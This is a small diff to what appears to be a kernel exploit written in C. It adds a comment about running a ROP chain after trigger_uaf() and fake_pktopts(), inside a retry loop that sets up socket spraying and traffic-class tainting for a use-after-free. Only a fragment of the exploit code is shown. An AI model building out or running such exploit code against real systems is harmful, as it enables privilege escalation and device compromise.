@@ -270,8 +270,9 @@ int main() {
         .kevent_sock = kevent_sock,
         .spray_sock = spray_sock
     };
-
-    int overlap_idx = -1;
+    
+// The userland ROP chain is only executed after trigger_uaf() and fake_pktopts() is validated
+    int overlap_idx = -1; 
     for (int attempts = 0; attempts < 5; attempts++) {
         trigger_uaf(&o);
         set_tclass(master_sock, TCLASS_TAINT);
